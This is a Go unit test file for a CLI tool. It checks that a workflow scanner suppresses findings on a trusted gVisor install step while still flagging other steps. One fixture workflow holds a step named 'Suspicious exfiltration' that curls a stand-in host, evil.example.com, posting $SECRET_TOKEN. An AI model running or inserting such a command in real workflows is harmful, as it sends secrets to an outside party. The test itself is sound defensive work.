//go:build !integration

package cli

import (
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// gvisorWorkflow mirrors a compiled gh-aw lock file containing the compiler-generated
// gVisor install step alongside an unrelated, genuinely suspicious curl command.
const gvisorWorkflow = `
name: Sandbox Workflow
on:
  workflow_dispatch:
jobs:
  agent:
    runs-on: ubuntu-slim
    steps:
      - name: Install gVisor (runsc)
        run: |
          set -euo pipefail
          ARCH=$(uname -m)
          URL="https://storage.googleapis.com/gvisor/releases/release/20250707.0/${ARCH}"
          curl -fsSL "${URL}/runsc" -o /tmp/runsc
          curl -fsSL "${URL}/runsc.sha512" -o /tmp/runsc.sha512
          (cd /tmp && sha512sum -c runsc.sha512)
      - name: Suspicious exfiltration
        run: |
          curl -fsSL https://evil.example.com/collect -d "secret=$SECRET_TOKEN"
`

func TestFilterGvisorInstallFindings(t *testing.T) {
	gitRoot := t.TempDir()
	writeWorkflow(t, gitRoot, "sandbox.lock.yml", gvisorWorkflow)

	findings := []runnerGuardFinding{
		// Line 15 is the "curl runsc" line inside the gVisor step — must be suppressed.
		{RuleID: "RGS-012", File: "sandbox.lock.yml", Line: 15},
		// Line 1 (representative/unknown) also matches, since the step is present in the file.
		{RuleID: "RGS-012", File: ".github/workflows/sandbox.lock.yml", Line: 1},
		// Line 19 is the genuinely suspicious exfiltration curl — must be preserved.
		{RuleID: "RGS-012", File: "sandbox.lock.yml", Line: 19},
		// Other rules must pass through untouched.
		{RuleID: "RGS-005", File: "sandbox.lock.yml", Line: 15},
	}

	filtered := filterGvisorInstallFindings(findings, gitRoot)

	require.Len(t, filtered, 2)
	assert.Equal(t, 19, filtered[0].Line)
	assert.Equal(t, "RGS-005", filtered[1].RuleID)
}

func TestFilterGvisorInstallFindingsKeepsFindingsForUnresolvableFiles(t *testing.T) {
	gitRoot := t.TempDir()

	findings := []runnerGuardFinding{
		{RuleID: "RGS-012", File: "../outside.lock.yml", Line: 1},
		{RuleID: "RGS-012", File: "does-not-exist.lock.yml", Line: 1},
	}

	assert.Len(t, filterGvisorInstallFindings(findings, gitRoot), 2)
}

func TestFindingInGvisorInstallStep(t *testing.T) {
	lines := []string{
		"jobs:",                                // 1
		"  agent:",                             // 2
		"    steps:",                           // 3
		"      - name: Install gVisor (runsc)", // 4
		"        run: |",                       // 5
		"          curl storage.googleapis.com/gvisor/x", // 6
		"      - name: Suspicious exfiltration",          // 7
		"        run: |",                                 // 8
		"          curl evil.example.com",                // 9
	}

	t.Run("line inside gVisor step matches", func(t *testing.T) {
		assert.True(t, findingInGvisorInstallStep(lines, 5))
		assert.True(t, findingInGvisorInstallStep(lines, 6))
	})

	t.Run("line inside a different step does not match", func(t *testing.T) {
		assert.False(t, findingInGvisorInstallStep(lines, 8))
		assert.False(t, findingInGvisorInstallStep(lines, 9))
	})

	t.Run("unknown line scans whole file", func(t *testing.T) {
		assert.True(t, findingInGvisorInstallStep(lines, 0))
		assert.True(t, findingInGvisorInstallStep(lines, 1))
	})

	t.Run("empty lines returns false", func(t *testing.T) {
		assert.False(t, findingInGvisorInstallStep(nil, 5))
	})
}

func TestReadWorkflowLines(t *testing.T) {
	assert.Nil(t, readWorkflowLines(""))
	assert.Nil(t, readWorkflowLines(filepath.Join(t.TempDir(), "missing.lock.yml")))
}
